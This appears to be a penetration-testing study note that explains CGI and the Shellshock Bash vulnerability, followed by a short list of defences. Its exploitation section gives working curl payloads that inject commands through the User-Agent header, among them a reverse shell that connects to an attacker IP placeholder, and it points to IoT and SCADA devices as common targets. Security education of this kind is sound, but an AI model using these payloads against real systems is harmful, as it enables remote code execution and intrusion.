
# CGI & Shellshock (CVE-2014-6271)

## 🧠 What Is CGI?

**CGI (Common Gateway Interface)** is a standard way for web servers to interact with external content-generating programs. When a browser requests a CGI script (often in `/cgi-bin/`), the server starts a new process, runs the script, and returns the output to the user.

### 🧩 The Critical Link: HTTP to Environment Variables

When a CGI script is executed, the web server passes the HTTP request headers (like `User-Agent` or `Referer`) to the script as **Environment Variables**.

* `User-Agent` becomes `$HTTP_USER_AGENT`
* `Referer` becomes `$HTTP_REFERER`

---

## 💥 Shellshock: The Bash Vulnerability

Shellshock is a bug in **Bash** that allows trailing commands to be executed after a function definition inside an environment variable.

### 🚀 Why it happens

Bash allows you to define functions in variables. The syntax looks like this: `() { :; };`.
The vulnerability occurs because Bash doesn't stop after the function definition—it continues to execute any code that follows it.

### 🧪 Practical Exploitation

If a CGI script starts with `#!/bin/bash`, it will trigger the vulnerability as soon as it reads the environment variables passed by the server.

#### 1. Identification (The "Safe" Test)

Before trying to read `/etc/passwd`, test if the server is vulnerable by making it "sleep":

```bash
curl -H "User-Agent: () { :; }; echo; /bin/sleep 5" http://TARGET/cgi-bin/test.cgi

```

*If the response takes 5 seconds to return, the server is vulnerable.*

#### 2. Data Exfiltration

```bash
curl -H "User-Agent: () { :; }; echo; echo; /usr/bin/id" http://TARGET/cgi-bin/test.cgi

```

*Note: The double `echo; echo;` is often required to provide the empty line that separates HTTP headers from the response body.*

#### 3. Reverse Shell

```bash
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'" http://TARGET/cgi-bin/test.cgi

```

---

## 🛠️ Summary Reference Table

| Target Header | Why it works |
| --- | --- |
| **User-Agent** | Most commonly passed to environment variables. |
| **Referer** | Often logged or processed by CGI scripts. |
| **Cookie** | Can be used if the script processes session data via Bash. |
| **Custom Header** | Any header can be turned into an env variable (`HTTP_NAME`). |

---

## 🧠 Pentester Mindset

* **The "Legacy" Factor:** You won't find Shellshock on a modern Ubuntu 24.04, but it is extremely common in **IoT devices, old routers, and industrial systems (SCADA)**.
* **Don't stop at `/cgi-bin/`:** Sometimes CGI scripts are mapped to other extensions like `.sh`, `.pl`, or `.cgi` anywhere in the web root.
* **Check DHCP/SSH:** Shellshock also affected other services that use environment variables, like DHCP clients and SSH (via `ForceCommand`).

---

## 🛡️ Defensive Measures

1. **Patch Bash:** This is the primary defense. Ensure `bash --version` is patched.
2. **Web Application Firewall (WAF):** Use signatures to detect the `() { :; };` pattern in headers.
3. **Principle of Least Privilege:** Ensure CGI scripts run as a low-privileged user (like `www-data`) and have a restricted shell.

